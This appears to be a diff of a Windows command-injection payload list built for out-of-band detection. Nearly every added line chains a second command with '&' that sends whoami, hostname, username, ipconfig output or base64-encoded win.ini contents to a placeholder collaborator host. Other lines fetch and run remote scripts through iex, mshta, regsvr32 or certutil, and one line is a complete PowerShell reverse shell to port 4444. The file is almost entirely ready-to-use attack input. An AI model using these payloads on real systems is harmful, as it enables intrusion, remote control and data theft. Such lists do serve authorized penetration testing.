@@ -1,7 +1,37 @@
-;nslookup COLLABORATOR
-&nslookup COLLABORATOR
-|ping -n 1 COLLABORATOR
-||ping -n 1 COLLABORATOR
-;powershell -c "Invoke-WebRequest http://COLLABORATOR"
-;powershell -c "nslookup COLLABORATOR"
-;certutil -urlcache -split -f http://COLLABORATOR/nc.exe nc.exe
+& powershell -c "Invoke-WebRequest http://COLLABORATOR_URL/?x=$(whoami)"
+& powershell -c "(New-Object Net.WebClient).DownloadString('http://COLLABORATOR_URL/?x='+(whoami))"
+& powershell -c "Resolve-DnsName COLLABORATOR_URL"
+& powershell -c "nslookup COLLABORATOR_URL"
+& powershell -c "[System.Net.Dns]::GetHostEntry('COLLABORATOR_URL')"
+& nslookup COLLABORATOR_URL
+& nslookup %COMPUTERNAME%.COLLABORATOR_URL
+& ping -n 1 %COMPUTERNAME%.COLLABORATOR_URL
+& curl http://COLLABORATOR_URL/?x=%COMPUTERNAME%
+& curl http://COLLABORATOR_URL/?x=%USERNAME%
+& wget http://COLLABORATOR_URL/?x=%COMPUTERNAME%
+& certutil -urlcache -f http://COLLABORATOR_URL/test
+& bitsadmin /transfer x http://COLLABORATOR_URL/?x=%COMPUTERNAME% C:\x
+& powershell -c "Invoke-WebRequest http://COLLABORATOR_URL/?hostname=$env:COMPUTERNAME"
+& powershell -c "Invoke-WebRequest http://COLLABORATOR_URL/?username=$env:USERNAME"
+& powershell -c "(New-Object Net.WebClient).UploadString('http://COLLABORATOR_URL/',$(whoami))"
+& powershell -c "Invoke-RestMethod -Uri http://COLLABORATOR_URL/ -Method Post -Body $(whoami)"
+& powershell -c "$x=whoami;Invoke-WebRequest http://COLLABORATOR_URL/?x=$x"
+& powershell -c "$x=[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes((Get-Content C:\Windows\win.ini)));Invoke-WebRequest http://COLLABORATOR_URL/?x=$x"
+& powershell -c "$x=[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes((ipconfig)));Invoke-WebRequest http://COLLABORATOR_URL/?x=$x"
+& powershell -c "Invoke-WebRequest http://COLLABORATOR_URL/?x=$([System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes((whoami))))"
+& powershell -c "Test-NetConnection COLLABORATOR_IP -Port 4444"
+& powershell -c "$client=New-Object System.Net.Sockets.TCPClient('COLLABORATOR_IP',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+& mshta http://COLLABORATOR_URL/
+& regsvr32 /s /n /u /i:http://COLLABORATOR_URL/test.sct scrobj.dll
+& certutil -urlcache -split -f http://COLLABORATOR_URL/test
+& bitsadmin /transfer x http://COLLABORATOR_URL/test C:\x
+& wmic process call create "powershell -c Invoke-WebRequest http://COLLABORATOR_URL/"
+& powershell -c "Invoke-WebRequest http://COLLABORATOR_URL/?a=$(systeminfo|Select-String 'OS Name'|ConvertFrom-String|Select -Expand P2)"
+& nslookup $(whoami | base64).COLLABORATOR_URL
+& powershell -c "[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; Invoke-WebRequest https://COLLABORATOR_URL/?x=$(whoami)"
+& powershell -c "iex(New-Object Net.WebClient).DownloadString('http://COLLABORATOR_URL/shell.ps1')"
+& echo $(whoami) | powershell -c "$input | Invoke-WebRequest http://COLLABORATOR_URL/"
+& for /f %i in ('whoami') do curl http://COLLABORATOR_URL/?x=%i
+& for /f "tokens=*" %i in ('ipconfig') do curl http://COLLABORATOR_URL/?x=%i
+& type C:\Windows\win.ini | powershell -c "$input | Invoke-WebRequest http://COLLABORATOR_URL/"
+& powershell -c "Get-Content C:\Windows\win.ini | Invoke-WebRequest http://COLLABORATOR_URL/ -Method Post -Body {$_}"
